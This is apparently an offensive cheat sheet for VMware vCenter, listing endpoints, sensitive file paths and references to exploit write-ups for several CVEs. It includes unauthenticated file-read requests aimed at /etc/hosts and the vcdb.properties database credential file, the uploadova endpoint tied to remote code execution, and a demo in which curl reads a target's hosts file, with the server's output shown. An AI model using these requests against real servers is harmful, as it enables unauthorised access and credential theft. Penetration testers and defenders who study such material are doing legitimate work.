- /sdk/vimServiceVersions.xml
- /vsphere-client/?csp
- /eam/vib?id=C:\\Windows\\System32\\drivers\\etc\\hosts
- /eam/vib?id=/etc/hosts
- /eam/vibd?id=/etc/hosts
- /eam/vibd?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties
- /ui/vropspluginui/rest/services/checkmobregister
- /ui/vropspluginui/rest/services/uploadova
- /checkmobregister
- /updatetelemetryInfo
- /checkLicenseSuiteApi
- /checkVsanLicenseValidity
- /getvcdetails
- /getstatus
- /testvcconnection
- /testvropsconnection
- /dashboard
- /capacity
- /capacity/memory
- /capacity/cpu
- /capacity/storage
- /license/allLicenses
- /vcclusters
- /vccontention
- /vcclusteralerts
- /inventoryscoreboard
- /alerts
- /vropsURL
- /vcIP
- /serverguid
- /Isceienabled
- /alertdetails
- /vsanalertdetails
- /osdetails
- /vmdetails
- /drs
- 
- POST /vropsinstallation content-type=application/json; charset=UTF-8
- POST /uploadova
- POST /configurevrops content-type=application/json; charset=UTF-8
- C:\\ProgramData\\VMware\\vCenterServer\\logs\\vsphere-client\\logs\\dataservice.log
- C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vsphere-client\\compatibility-matrix.xml
- C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vsphere-client\\webclient.properties
- C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties


### Demo
```
$ curl -ik https://10.x.y.z/vsphere-client/?csp
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=CB600A5211B6C4B056FAFCFB86DEBDC805C0; Path=/vsphere-client/; Secure; HttpOnly
X-UA-Compatible: IE=edge
X-Frame-Options: SAMEORIGIN
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 7650
Date: Wed, 24 Feb 2021 06:09:04 GMT


curl -ik https://10.x.y.z/eam/vib?id=C:\\Windows\\System32\\drivers\\etc\\hosts
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Date: Wed, 24 Feb 2021 05:55:37 GMT
Server: Apache

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
```


### Ref
- https://twitter.com/jas502n/status/1316992409088094209
- [CVE-2021-21972 Vmware vcenter未授权任意文件漏洞分析](https://www.cnblogs.com/potatsoSec/p/14444897.html)
- [Unauthorized RCE in VMware vCenter](https://swarm.ptsecurity.com/unauth-rce-vmware/)
- https://attackerkb.com/topics/5nZX40suYA/cve-2021-21980
- [VMSA-2021-0027 的额外东东](https://articles.zsxq.com/id_1cnl8w2r5hsh.html)
- [Stealing administrative JWT's through post auth SSRF (CVE-2021-22056)](https://blog.assetnote.io/2022/01/17/workspace-one-access-ssrf/)
- https://github.com/shmilylty/cve-2021-22005-exp
- [VMware vCenter漏洞实战利用总结](https://mp.weixin.qq.com/s/0gg5TDEtL3lCb9pOnm42gg)
- https://www.horizon3.ai/vmware-authentication-bypass-vulnerability-cve-2022-22972-technical-deep-dive/
